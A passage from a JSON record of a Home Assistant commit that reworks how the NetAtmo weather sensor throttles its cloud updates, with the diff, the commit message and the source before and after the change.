SENSOR_TYPES[self.type][1]\n        module_id = self.netatmo_data.\\\n            station_data.moduleByName(module=module_name)['_id']\n        self.module_id = module_id[1]\n\n    @property\n    def name(self):\n        \"\"\"Return the name of the sensor.\"\"\"\n        return self._name\n\n    @property\n    def icon(self):\n        \"\"\"Icon to use in the frontend, if any.\"\"\"\n        return self._icon\n\n    @property\n    def device_class(self):\n        \"\"\"Return the device class of the sensor.\"\"\"\n        return self._device_class\n\n    @property\n    def state(self):\n        \"\"\"Return the state of the device.\"\"\"\n        return self._state\n\n    @property\n    def unit_of_measurement(self):\n        \"\"\"Return the unit of measurement of this entity, if any.\"\"\"\n        return self._unit_of_measurement\n\n    def update(self):\n        \"\"\"Get the latest data from NetAtmo API and updates the states.\"\"\"\n        self.netatmo_data.update()\n        data = self.netatmo_data.data.get(self.module_name)\n\n        if data is None:\n            _LOGGER.warning(\"No data found for %s\", self.module_name)\n            self._state = STATE_UNKNOWN\n            return\n\n        if self.type == 'temperature':\n            self._state = round(data['Temperature'], 1)\n        elif self.type == 'humidity':\n            self._state = data['Humidity']\n        elif self.type == 'rain':\n            self._state = data['Rain']\n        elif self.type == 'sum_rain_1':\n            self._state = data['sum_rain_1']\n        elif self.type == 'sum_rain_24':\n            self._state = data['sum_rain_24']\n        elif self.type == 'noise':\n            self._state = data['Noise']\n        elif self.type == 'co2':\n            self._state = data['CO2']\n        elif self.type == 'pressure':\n            self._state = round(data['Pressure'], 1)\n        elif self.type == 'battery_lvl':\n            self._state = data['battery_vp']\n        elif self.type == 'battery_vp' and self.module_id == '6':\n            if data['battery_vp'] >= 5590:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5180:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4770:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4360:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4360:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '5':\n            if data['battery_vp'] >= 5500:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5000:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4500:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4000:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4000:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '3':\n            if data['battery_vp'] >= 5640:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5280:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4920:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4560:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4560:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '2':\n            if data['battery_vp'] >= 5500:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5000:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4500:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4000:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4000:\n                self._state = \"Very Low\"\n        elif self.type == 'min_temp':\n            self._state = data['min_temp']\n        elif self.type == 'max_temp':\n            self._state = data['max_temp']\n        elif self.type == 'windangle_value':\n            self._state = data['WindAngle']\n        elif self.type == 'windangle':\n            if data['WindAngle'] >= 330:\n                self._state = \"N (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 300:\n                self._state = \"NW (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 240:\n                self._state = \"W (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 210:\n                self._state = \"SW (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 150:\n                self._state = \"S (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 120:\n                self._state = \"SE (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 60:\n                self._state = \"E (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 30:\n                self._state = \"NE (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 0:\n                self._state = \"N (%d\\xb0)\" % data['WindAngle']\n        elif self.type == 'windstrength':\n            self._state = data['WindStrength']\n        elif self.type == 'gustangle_value':\n            self._state = data['GustAngle']\n        elif self.type == 'gustangle':\n            if data['GustAngle'] >= 330:\n                self._state = \"N (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 300:\n                self._state = \"NW (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 240:\n                self._state = \"W (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 210:\n                self._state = \"SW (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 150:\n                self._state = \"S (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 120:\n                self._state = \"SE (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 60:\n                self._state = \"E (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 30:\n                self._state = \"NE (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 0:\n                self._state = \"N (%d\\xb0)\" % data['GustAngle']\n        elif self.type == 'guststrength':\n            self._state = data['GustStrength']\n        elif self.type == 'rf_status_lvl':\n            self._state = data['rf_status']\n        elif self.type == 'rf_status':\n            if data['rf_status'] >= 90:\n                self._state = \"Low\"\n            elif data['rf_status'] >= 76:\n                self._state = \"Medium\"\n            elif data['rf_status'] >= 60:\n                self._state = \"High\"\n            elif data['rf_status'] <= 59:\n                self._state = \"Full\"\n        elif self.type == 'wifi_status_lvl':\n            self._state = data['wifi_status']\n        elif self.type == 'wifi_status':\n            if data['wifi_status'] >= 86:\n                self._state = \"Low\"\n            elif data['wifi_status'] >= 71:\n                self._state = \"Medium\"\n            elif data['wifi_status'] >= 56:\n                self._state = \"High\"\n            elif data['wifi_status'] <= 55:\n                self._state = \"Full\"\n\n\nclass NetAtmoData(object):\n    \"\"\"Get the latest data from NetAtmo.\"\"\"\n\n    def __init__(self, auth, station):\n        \"\"\"Initialize the data object.\"\"\"\n        self.auth = auth\n        self.data = None\n        self.station_data = None\n        self.station = station\n\n    def get_module_names(self):\n        \"\"\"Return all module available on the API as a list.\"\"\"\n        self.update()\n        return self.data.keys()\n\n    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n    def update(self):\n        \"\"\"Call the Netatmo API to update the data.\"\"\"\n        import pyatmo\n        self.station_data = pyatmo.WeatherStationData(self.auth)\n\n        if self.station is not None:\n            self.data = self.station_data.lastData(\n                station=self.station, exclude=3600)\n        else:\n            self.data = self.station_data.lastData(exclude=3600)\n"}}, "msg": "Improve NetAtmo sensors update logic (#14866)\n\n* Added a \"last update\" sensor that could be used by automations + cosmetic changes\r\n\r\n* Improved the update logic of sensor data\r\n\r\nThe platform is now continuously adjusting the refresh interval\r\nin order to synchronize with the expected next update from the\r\nNetAtmo cloud. This significantly improves reaction time of\r\nautomations while keeping the refresh time to the recommended\r\nvalue (10 minutes).\r\n\r\n* Linting\r\n\r\n* Incorporated the advanced Throttle class to support adaptive\r\nthrottling, as opposed to integrating it in the core framework.\r\n\r\nFollowing code review, it was suggested to implement the\r\nspecialised Throttle class in this platform instead of making a\r\nchange in the general util package. Except that the required change\r\n(about 4 LoC) is part of the only relevant piece of code of that\r\nclass, therefore this commit includes a full copy of the Throttle\r\nclass from homeassistant.util, plus the extra feature to support\r\nadaptive throttling.\r\n\r\n* Cosmetic changes on the introduced \"last updated\" sensor\r\n\r\n* Alternate implementation for the adaptive throttling\r\n\r\nEnsure the updates from the cloud are throttled and adapted to the\r\nlast update time provided by NetAtmo, without using the Throttle\r\ndecorator. Similar logic and similar usage of a lock to protect\r\nthe execution of the remote update.\r\n\r\n* Linting"}}, "https://github.com/sara0871/master.zip": {"9ea0c409e6cea69cce632079548165ad5a9f2554": {"url": "https://api.github.com/repos/sara0871/master.zip/commits/9ea0c409e6cea69cce632079548165ad5a9f2554", "html_url": "https://github.com/sara0871/master.zip/commit/9ea0c409e6cea69cce632079548165ad5a9f2554", "message": "Improve NetAtmo sensors update logic (#14866)\n\n* Added a \"last update\" sensor that could be used by automations + cosmetic changes\r\n\r\n* Improved the update logic of sensor data\r\n\r\nThe platform is now continuously adjusting the refresh interval\r\nin order to synchronize with the expected next update from the\r\nNetAtmo cloud. This significantly improves reaction time of\r\nautomations while keeping the refresh time to the recommended\r\nvalue (10 minutes).\r\n\r\n* Linting\r\n\r\n* Incorporated the advanced Throttle class to support adaptive\r\nthrottling, as opposed to integrating it in the core framework.\r\n\r\nFollowing code review, it was suggested to implement the\r\nspecialised Throttle class in this platform instead of making a\r\nchange in the general util package. Except that the required change\r\n(about 4 LoC) is part of the only relevant piece of code of that\r\nclass, therefore this commit includes a full copy of the Throttle\r\nclass from homeassistant.util, plus the extra feature to support\r\nadaptive throttling.\r\n\r\n* Cosmetic changes on the introduced \"last updated\" sensor\r\n\r\n* Alternate implementation for the adaptive throttling\r\n\r\nEnsure the updates from the cloud are throttled and adapted to the\r\nlast update time provided by NetAtmo, without using the Throttle\r\ndecorator. Similar logic and similar usage of a lock to protect\r\nthe execution of the remote update.\r\n\r\n* Linting", "sha": "9ea0c409e6cea69cce632079548165ad5a9f2554", "keyword": "remote code execution protect", "diff": "diff --git a/homeassistant/components/sensor/netatmo.py b/homeassistant/components/sensor/netatmo.py\nindex 191e587fe..bdc2c5990 100644\n--- a/homeassistant/components/sensor/netatmo.py\n+++ b/homeassistant/components/sensor/netatmo.py\n@@ -5,7 +5,8 @@\n https://home-assistant.io/components/sensor.netatmo/\n \"\"\"\n import logging\n-from datetime import timedelta\n+from time import time\n+import threading\n \n import voluptuous as vol\n \n@@ -14,7 +15,6 @@\n     TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE,\n     STATE_UNKNOWN)\n from homeassistant.helpers.entity import Entity\n-from homeassistant.util import Throttle\n import homeassistant.helpers.config_validation as cv\n \n _LOGGER = logging.getLogger(__name__)\n@@ -24,8 +24,8 @@\n \n DEPENDENCIES = ['netatmo']\n \n-# NetAtmo Data is uploaded to server every 10 minutes\n-MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n+# This is the NetAtmo data upload interval in seconds\n+NETATMO_UPDATE_INTERVAL = 600\n \n SENSOR_TYPES = {\n     'temperature': ['Temperature', TEMP_CELSIUS, None,\n@@ -50,7 +50,8 @@\n     'rf_status': ['Radio', '', 'mdi:signal', None],\n     'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n     'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n-    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n+    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],\n+    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],\n }\n \n MODULE_SCHEMA = vol.Schema({\n@@ -76,11 +77,11 @@ def setup_platform(hass, config, add_devices, discovery_info=None):\n             # Iterate each module\n             for module_name, monitored_conditions in\\\n                     config[CONF_MODULES].items():\n-                # Test if module exist \"\"\"\n+                # Test if module exists\n                 if module_name not in data.get_module_names():\n                     _LOGGER.error('Module name: \"%s\" not found', module_name)\n                     continue\n-                # Only create sensor for monitored \"\"\"\n+                # Only create sensors for monitored properties\n                 for variable in monitored_conditions:\n                     dev.append(NetAtmoSensor(data, module_name, variable))\n         else:\n@@ -285,6 +286,8 @@ def update(self):\n                 self._state = \"High\"\n             elif data['wifi_status'] <= 55:\n                 self._state = \"Full\"\n+        elif self.type == 'lastupdated':\n+            self._state = int(time() - data['When'])\n \n \n class NetAtmoData(object):\n@@ -296,20 +299,57 @@ def __init__(self, auth, station):\n         self.data = None\n         self.station_data = None\n         self.station = station\n+        self._next_update = time()\n+        self._update_in_progress = threading.Lock()\n \n     def get_module_names(self):\n         \"\"\"Return all module available on the API as a list.\"\"\"\n         self.update()\n         return self.data.keys()\n \n-    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n     def update(self):\n-        \"\"\"Call the Netatmo API to update the data.\"\"\"\n-        import pyatmo\n-        self.station_data = pyatmo.WeatherStationData(self.auth)\n+        \"\"\"Call the Netatmo API to update the data.\n \n-        if self.station is not None:\n-            self.data = self.station_data.lastData(\n-                station=self.station, exclude=3600)\n-        else:\n-            self.data = self.station_data.lastData(exclude=3600)\n+        This method is not throttled by the builtin Throttle decorator\n+        but with a custom logic, which takes into account the time\n+        of the last update from the cloud.\n+        \"\"\"\n+        if time() < self._next_update or \\\n+                not self._update_in_progress.acquire(False):\n+            return\n+\n+        try:\n+            import pyatmo\n+            self.station_data = pyatmo.WeatherStationData(self.auth)\n+\n+            if self.station is not None:\n+                self.data = self.station_data.lastData(\n+                    station=self.station, exclude=3600)\n+            else:\n+                self.data = self.station_data.lastData(exclude=3600)\n+\n+            newinterval = 0\n+            for module in self.data:\n+                if 'When' in self.data[module]:\n+                    newinterval = self.data[module]['When']\n+                    break\n+            if newinterval:\n+                # Try and estimate when fresh data will be available\n+                newinterval += NETATMO_UPDATE_INTERVAL - time()\n+                if newinterval > NETATMO_UPDATE_INTERVAL - 30:\n+                    newinterval = NETATMO_UPDATE_INTERVAL\n+                else:\n+                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:\n+                        # Never hammer the NetAtmo API more than\n+                        # twice per update interval\n+                        newinterval = NETATMO_UPDATE_INTERVAL / 2\n+                    _LOGGER.warning(\n+                        \"NetAtmo refresh interval reset to %d seconds\",\n+                        newinterval)\n+            else:\n+                # Last update time not found, fall back to default value\n+                newinterval = NETATMO_UPDATE_INTERVAL\n+\n+            self._next_update = time() + newinterval\n+        finally:\n+            self._update_in_progress.release()\n", "files": {"/homeassistant/components/sensor/netatmo.py": {"changes": [{"diff": "\n https://home-assistant.io/components/sensor.netatmo/\n \"\"\"\n import logging\n-from datetime import timedelta\n+from time import time\n+import threading\n \n import voluptuous as vol\n \n", "add": 2, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["from datetime import timedelta"], "goodparts": ["from time import time", "import threading"]}, {"diff": "\n     STATE_UNKNOWN)\n from homeassistant.helpers.entity import Entity\n-from homeassistant.util import Throttle\n import homeassistant.helpers.config_validation as cv\n \n _LOGGER = logging.getLogger(__name__)\n", "add": 0, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["from homeassistant.util import Throttle"], "goodparts": []}, {"diff": "\n DEPENDENCIES = ['netatmo']\n \n-# NetAtmo Data is uploaded to server every 10 minutes\n-MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n+# This is the NetAtmo data upload interval in seconds\n+NETATMO_UPDATE_INTERVAL = 600\n \n SENSOR_TYPES = {\n     'temperature': ['Temperature', TEMP_CELSIUS, None,\n", "add": 2, "remove": 2, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)"], "goodparts": ["NETATMO_UPDATE_INTERVAL = 600"]}, {"diff": "\n     'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n     'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n-    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n+    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],\n+    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],\n }\n \n MODULE_SCHEMA = vol.Schema({\n", "add": 2, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]"], "goodparts": ["    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],", "    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],"]}, {"diff": "\n         self.data = None\n         self.station_data = None\n         self.station = station\n+        self._next_update = time()\n+        self._update_in_progress = threading.Lock()\n \n     def get_module_names(self):\n         \"\"\"Return all module available on the API as a list.\"\"\"\n         self.update()\n         return self.data.keys()\n \n-    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n     def update(self):\n-        \"\"\"Call the Netatmo API to update the data.\"\"\"\n-        import pyatmo\n-        self.station_data = pyatmo.WeatherStationData(self.auth)\n+        \"\"\"Call the Netatmo API to update the data.\n \n-        if self.station is not None:\n-            self.data = self.station_data.lastData(\n-                station=self.station, exclude=3600)\n-        else:\n-            self.data = self.station_data.lastData(exclude=3600)\n+        This method is not throttled by the builtin Throttle decorator\n+        but with a custom logic, which takes into account the time\n+        of the last update from the cloud.\n+        \"\"\"\n+        if time() < self._next_update or \\\n+                not self._update_in_progress.acquire(False):\n+            return\n+\n+        try:\n+            import pyatmo\n+            self.station_data = pyatmo.WeatherStationData(self.auth)\n+\n+            if self.station is not None:\n+                self.data = self.station_data.lastData(\n+                    station=self.station, exclude=3600)\n+            else:\n+                self.data = self.station_data.lastData(exclude=3600)\n+\n+            newinterval = 0\n+            for module in self.data:\n+                if 'When' in self.data[module]:\n+                    newinterval = self.data[module]['When']\n+                    break\n+            if newinterval:\n+                # Try and estimate when fresh data will be available\n+                newinterval += NETATMO_UPDATE_INTERVAL - time()\n+                if newinterval > NETATMO_UPDATE_INTERVAL - 30:\n+                    newinterval = NETATMO_UPDATE_INTERVAL\n+                else:\n+                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:\n+                        # Never hammer the NetAtmo API more than\n+                        # twice per update interval\n+                        newinterval = NETATMO_UPDATE_INTERVAL / 2\n+                    _LOGGER.warning(\n+                        \"NetAtmo refresh interval reset to %d seconds\",\n+                        newinterval)\n+            else:\n+                # Last update time not found, fall back to default value\n+                newinterval = NETATMO_UPDATE_INTERVAL\n+\n+            self._next_update = time() + newinterval\n+        finally:\n+            self._update_in_progress.release()\n", "add": 46, "remove": 9, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["    @Throttle(MIN_TIME_BETWEEN_UPDATES)", "        \"\"\"Call the Netatmo API to update the data.\"\"\"", "        import pyatmo", "        self.station_data = pyatmo.WeatherStationData(self.auth)", "        if self.station is not None:", "            self.data = self.station_data.lastData(", "                station=self.station, exclude=3600)", "        else:", "            self.data = self.station_data.lastData(exclude=3600)"], "goodparts": ["        self._next_update = time()", "        self._update_in_progress = threading.Lock()", "        \"\"\"Call the Netatmo API to update the data.", "        This method is not throttled by the builtin Throttle decorator", "        but with a custom logic, which takes into account the time", "        of the last update from the cloud.", "        \"\"\"", "        if time() < self._next_update or \\", "                not self._update_in_progress.acquire(False):", "            return", "        try:", "            import pyatmo", "            self.station_data = pyatmo.WeatherStationData(self.auth)", "            if self.station is not None:", "                self.data = self.station_data.lastData(", "                    station=self.station, exclude=3600)", "            else:", "                self.data = self.station_data.lastData(exclude=3600)", "            newinterval = 0", "            for module in self.data:", "                if 'When' in self.data[module]:", "                    newinterval = self.data[module]['When']", "                    break", "            if newinterval:", "                newinterval += NETATMO_UPDATE_INTERVAL - time()", "                if newinterval > NETATMO_UPDATE_INTERVAL - 30:", "                    newinterval = NETATMO_UPDATE_INTERVAL", "                else:", "                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:", "                        newinterval = NETATMO_UPDATE_INTERVAL / 2", "                    _LOGGER.warning(", "                        \"NetAtmo refresh interval reset to %d seconds\",", "                        newinterval)", "            else:", "                newinterval = NETATMO_UPDATE_INTERVAL", "            self._next_update = time() + newinterval", "        finally:", "            self._update_in_progress.release()"]}], "source": "\n\"\"\" Support for the NetAtmo Weather Service. For more details about this platform, please refer to the documentation at https://home-assistant.io/components/sensor.netatmo/ \"\"\" import logging from datetime import timedelta import voluptuous as vol from homeassistant.components.sensor import PLATFORM_SCHEMA from homeassistant.const import( TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE, STATE_UNKNOWN) from homeassistant.helpers.entity import Entity from homeassistant.util import Throttle import homeassistant.helpers.config_validation as cv _LOGGER=logging.getLogger(__name__) CONF_MODULES='modules' CONF_STATION='station' DEPENDENCIES=['netatmo'] MIN_TIME_BETWEEN_UPDATES=timedelta(seconds=600) SENSOR_TYPES={ 'temperature':['Temperature', TEMP_CELSIUS, None, DEVICE_CLASS_TEMPERATURE], 'co2':['CO2', 'ppm', 'mdi:cloud', None], 'pressure':['Pressure', 'mbar', 'mdi:gauge', None], 'noise':['Noise', 'dB', 'mdi:volume-high', None], 'humidity':['Humidity', '%', None, DEVICE_CLASS_HUMIDITY], 'rain':['Rain', 'mm', 'mdi:weather-rainy', None], 'sum_rain_1':['sum_rain_1', 'mm', 'mdi:weather-rainy', None], 'sum_rain_24':['sum_rain_24', 'mm', 'mdi:weather-rainy', None], 'battery_vp':['Battery', '', 'mdi:battery', None], 'battery_lvl':['Battery_lvl', '', 'mdi:battery', None], 'min_temp':['Min Temp.', TEMP_CELSIUS, 'mdi:thermometer', None], 'max_temp':['Max Temp.', TEMP_CELSIUS, 'mdi:thermometer', None], 'windangle':['Angle', '', 'mdi:compass', None], 'windangle_value':['Angle Value', '\u00ba', 'mdi:compass', None], 'windstrength':['Strength', 'km/h', 'mdi:weather-windy', None], 'gustangle':['Gust Angle', '', 'mdi:compass', None], 'gustangle_value':['Gust Angle Value', '\u00ba', 'mdi:compass', None], 'guststrength':['Gust Strength', 'km/h', 'mdi:weather-windy', None], 'rf_status':['Radio', '', 'mdi:signal', None], 'rf_status_lvl':['Radio_lvl', '', 'mdi:signal', None], 'wifi_status':['Wifi', '', 'mdi:wifi', None], 'wifi_status_lvl':['Wifi_lvl', 'dBm', 'mdi:wifi', None] } MODULE_SCHEMA=vol.Schema({ vol.Required(cv.string): vol.All(cv.ensure_list,[vol.In(SENSOR_TYPES)]), }) PLATFORM_SCHEMA=PLATFORM_SCHEMA.extend({ vol.Optional(CONF_STATION): cv.string, vol.Optional(CONF_MODULES): MODULE_SCHEMA, }) def setup_platform(hass, config, add_devices, discovery_info=None): \"\"\"Set up the available Netatmo weather sensors.\"\"\" netatmo=hass.components.netatmo data=NetAtmoData(netatmo.NETATMO_AUTH, config.get(CONF_STATION, None)) dev=[] import pyatmo try: if CONF_MODULES in config: for module_name, monitored_conditions in\\ config[CONF_MODULES].items(): if module_name not in data.get_module_names(): _LOGGER.error('Module name: \"%s\" not found', module_name) continue for variable in monitored_conditions: dev.append(NetAtmoSensor(data, module_name, variable)) else: for module_name in data.get_module_names(): for variable in\\ data.station_data.monitoredConditions(module_name): if variable in SENSOR_TYPES.keys(): dev.append(NetAtmoSensor(data, module_name, variable)) else: _LOGGER.warning(\"Ignoring unknown var %s for mod %s\", variable, module_name) except pyatmo.NoDevice: return None add_devices(dev, True) class NetAtmoSensor(Entity): \"\"\"Implementation of a Netatmo sensor.\"\"\" def __init__(self, netatmo_data, module_name, sensor_type): \"\"\"Initialize the sensor.\"\"\" self._name='Netatmo{}{}'.format(module_name, SENSOR_TYPES[sensor_type][0]) self.netatmo_data=netatmo_data self.module_name=module_name self.type=sensor_type self._state=None self._device_class=SENSOR_TYPES[self.type][3] self._icon=SENSOR_TYPES[self.type][2] self._unit_of_measurement=SENSOR_TYPES[self.type][1] module_id=self.netatmo_data.\\ station_data.moduleByName(module=module_name)['_id'] self.module_id=module_id[1] @property def name(self): \"\"\"Return the name of the sensor.\"\"\" return self._name @property def icon(self): \"\"\"Icon to use in the frontend, if any.\"\"\" return self._icon @property def device_class(self): \"\"\"Return the device class of the sensor.\"\"\" return self._device_class @property def state(self): \"\"\"Return the state of the device.\"\"\" return self._state @property def unit_of_measurement(self): \"\"\"Return the unit of measurement of this entity, if any.\"\"\" return self._unit_of_measurement def update(self): \"\"\"Get the latest data from NetAtmo API and updates the states.\"\"\" self.netatmo_data.update() data=self.netatmo_data.data.get(self.module_name) if data is None: _LOGGER.warning(\"No data found for %s\", self.module_name) self._state=STATE_UNKNOWN return if self.type=='temperature': self._state=round(data['Temperature'], 1) elif self.type=='humidity': self._state=data['Humidity'] elif self.type=='rain': self._state=data['Rain'] elif self.type=='sum_rain_1': self._state=data['sum_rain_1'] elif self.type=='sum_rain_24': self._state=data['sum_rain_24'] elif self.type=='noise': self._state=data['Noise'] elif self.type=='co2': self._state=data['CO2'] elif self.type=='pressure': self._state=round(data['Pressure'], 1) elif self.type=='battery_lvl': self._state=data['battery_vp'] elif self.type=='battery_vp' and self.module_id=='6': if data['battery_vp'] >=5590: self._state=\"Full\" elif data['battery_vp'] >=5180: self._state=\"High\" elif data['battery_vp'] >=4770: self._state=\"Medium\" elif data['battery_vp'] >=4360: self._state=\"Low\" elif data['battery_vp'] < 4360: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='5': if data['battery_vp'] >=5500: self._state=\"Full\" elif data['battery_vp'] >=5000: self._state=\"High\" elif data['battery_vp'] >=4500: self._state=\"Medium\" elif data['battery_vp'] >=4000: self._state=\"Low\" elif data['battery_vp'] < 4000: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='3': if data['battery_vp'] >=5640: self._state=\"Full\" elif data['battery_vp'] >=5280: self._state=\"High\" elif data['battery_vp'] >=4920: self._state=\"Medium\" elif data['battery_vp'] >=4560: self._state=\"Low\" elif data['battery_vp'] < 4560: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='2': if data['battery_vp'] >=5500: self._state=\"Full\" elif data['battery_vp'] >=5000: self._state=\"High\" elif data['battery_vp'] >=4500: self._state=\"Medium\" elif data['battery_vp'] >=4000: self._state=\"Low\" elif data['battery_vp'] < 4000: self._state=\"Very Low\" elif self.type=='min_temp': self._state=data['min_temp'] elif self.type=='max_temp': self._state=data['max_temp'] elif self.type=='windangle_value': self._state=data['WindAngle'] elif self.type=='windangle': if data['WindAngle'] >=330: self._state=\"N(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=300: self._state=\"NW(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=240: self._state=\"W(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=210: self._state=\"SW(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=150: self._state=\"S(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=120: self._state=\"SE(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=60: self._state=\"E(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=30: self._state=\"NE(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=0: self._state=\"N(%d\\xb0)\" % data['WindAngle'] elif self.type=='windstrength': self._state=data['WindStrength'] elif self.type=='gustangle_value': self._state=data['GustAngle'] elif self.type=='gustangle': if data['GustAngle'] >=330: self._state=\"N(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=300: self._state=\"NW(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=240: self._state=\"W(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=210: self._state=\"SW(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=150: self._state=\"S(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=120: self._state=\"SE(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=60: self._state=\"E(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=30: self._state=\"NE(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=0: self._state=\"N(%d\\xb0)\" % data['GustAngle'] elif self.type=='guststrength': self._state=data['GustStrength'] elif self.type=='rf_status_lvl': self._state=data['rf_status'] elif self.type=='rf_status': if data['rf_status'] >=90: self._state=\"Low\" elif data['rf_status'] >=76: self._state=\"Medium\" elif data['rf_status'] >=60: self._state=\"High\" elif data['rf_status'] <=59: self._state=\"Full\" elif self.type=='wifi_status_lvl': self._state=data['wifi_status'] elif self.type=='wifi_status': if data['wifi_status'] >=86: self._state=\"Low\" elif data['wifi_status'] >=71: self._state=\"Medium\" elif data['wifi_status'] >=56: self._state=\"High\" elif data['wifi_status'] <=55: self._state=\"Full\" class NetAtmoData(object): \"\"\"Get the latest data from NetAtmo.\"\"\" def __init__(self, auth, station): \"\"\"Initialize the data object.\"\"\" self.auth=auth self.data=None self.station_data=None self.station=station def get_module_names(self): \"\"\"Return all module available on the API as a list.\"\"\" self.update() return self.data.keys() @Throttle(MIN_TIME_BETWEEN_UPDATES) def update(self): \"\"\"Call the Netatmo API to update the data.\"\"\" import pyatmo self.station_data=pyatmo.WeatherStationData(self.auth) if self.station is not None: self.data=self.station_data.lastData( station=self.station, exclude=3600) else: self.data=self.station_data.lastData(exclude=3600) ", "sourceWithComments": "\"\"\"\nSupport for the NetAtmo Weather Service.\n\nFor more details about this platform, please refer to the documentation at\nhttps://home-assistant.io/components/sensor.netatmo/\n\"\"\"\nimport logging\nfrom datetime import timedelta\n\nimport voluptuous as vol\n\nfrom homeassistant.components.sensor import PLATFORM_SCHEMA\nfrom homeassistant.const import (\n    TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE,\n    STATE_UNKNOWN)\nfrom homeassistant.helpers.entity import Entity\nfrom homeassistant.util import Throttle\nimport homeassistant.helpers.config_validation as cv\n\n_LOGGER = logging.getLogger(__name__)\n\nCONF_MODULES = 'modules'\nCONF_STATION = 'station'\n\nDEPENDENCIES = ['netatmo']\n\n# NetAtmo Data is uploaded to server every 10 minutes\nMIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n\nSENSOR_TYPES = {\n    'temperature': ['Temperature', TEMP_CELSIUS, None,\n                    DEVICE_CLASS_TEMPERATURE],\n    'co2': ['CO2', 'ppm', 'mdi:cloud', None],\n    'pressure': ['Pressure', 'mbar', 'mdi:gauge', None],\n    'noise': ['Noise', 'dB', 